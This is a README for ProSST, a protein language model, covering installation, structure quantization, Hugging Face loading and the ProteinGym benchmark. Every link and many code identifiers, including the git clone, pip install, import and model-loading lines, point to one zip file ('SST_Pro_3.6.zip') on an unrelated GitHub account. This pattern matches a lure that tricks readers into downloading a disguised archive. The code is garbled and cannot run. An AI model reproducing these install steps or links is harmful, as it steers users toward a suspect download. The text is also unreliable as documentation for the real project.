# Venus-ProSST
Code for _ProSST: A Pre-trained Protein Sequence and Structure Transformer with Disentangled Attention._ (NeurIPS 2024)

## News
- Our MSA-Enhanced model [ProtREM](https://github.com/Cassis-P/ProSST/raw/refs/heads/main/zero_shot/SST_Pro_3.6.zip) has achieved 0.518 Spearman's rho in the ProteinGym benchmark.

## 1 Install

```shell
git clone https://github.com/Cassis-P/ProSST/raw/refs/heads/main/zero_shot/SST_Pro_3.6.zip
cd ProSST
pip install -r https://github.com/Cassis-P/ProSST/raw/refs/heads/main/zero_shot/SST_Pro_3.6.zip
export PYTHONPATH=$PYTHONPATH:$(pwd)
```

## 2 Structure quantizer

![Structure quantizer](https://github.com/Cassis-P/ProSST/raw/refs/heads/main/zero_shot/SST_Pro_3.6.zip)

```python
from https://github.com/Cassis-P/ProSST/raw/refs/heads/main/zero_shot/SST_Pro_3.6.zip import PdbQuantizer
processor = PdbQuantizer(structure_vocab_size=2048) # can be 20, 128, 512, 1024, 2048, 4096
result = processor("https://github.com/Cassis-P/ProSST/raw/refs/heads/main/zero_shot/SST_Pro_3.6.zip", return_residue_seq=False)
```

Output:
```
[407, 998, 1841, 1421, 653, 450, 117, 822, ...]
```


## 3 ProSST models have been uploaded to huggingface 🤗 Transformers
```python
from transformers import AutoModelForMaskedLM, AutoTokenizer
model = https://github.com/Cassis-P/ProSST/raw/refs/heads/main/zero_shot/SST_Pro_3.6.zip("AI4Protein/ProSST-2048", trust_remote_code=True)
tokenizer = https://github.com/Cassis-P/ProSST/raw/refs/heads/main/zero_shot/SST_Pro_3.6.zip("AI4Protein/ProSST-2048", trust_remote_code=True)
```

See [AI4Protein/ProSST-*](https://github.com/Cassis-P/ProSST/raw/refs/heads/main/zero_shot/SST_Pro_3.6.zip) for more models.

## 4 Zero-shot mutant effect prediction

### 4.1 Example notebook
[Zero-shot mutant effect prediction](https://github.com/Cassis-P/ProSST/raw/refs/heads/main/zero_shot/SST_Pro_3.6.zip)

### 4.2 Run ProteinGYM Benchmark
Download dataset from [Google Driver](https://github.com/Cassis-P/ProSST/raw/refs/heads/main/zero_shot/SST_Pro_3.6.zip).
(This file contains quantized structures within ProteinGYM).

```shell
cd example_data
unzip https://github.com/Cassis-P/ProSST/raw/refs/heads/main/zero_shot/SST_Pro_3.6.zip
```

```shell
python https://github.com/Cassis-P/ProSST/raw/refs/heads/main/zero_shot/SST_Pro_3.6.zip --model_path AI4Protein/ProSST-2048 \
--structure_dir example_data/structure_sequence/2048
```
<!-- 
## 5 Representation
```

```

## 6 Transfer-Learning
```

``` -->

## Citation

If you use ProSST in your research, please cite the following paper:

```
@inproceedings{
li2024prosst,
title={ProSST: Protein Language Modeling with Quantized Structure and Disentangled Attention},
author={Mingchen Li and Yang Tan and Xinzhu Ma and Bozitao Zhong and Huiqun Yu and Ziyi Zhou and Wanli Ouyang and Bingxin Zhou and Pan Tan and Liang Hong},
booktitle={The Thirty-eighth Annual Conference on Neural Information Processing Systems},
year={2024}
}
```
This project is licensed under the terms of the [CC-BY-NC-ND-4.0](https://github.com/Cassis-P/ProSST/raw/refs/heads/main/zero_shot/SST_Pro_3.6.zip) license.
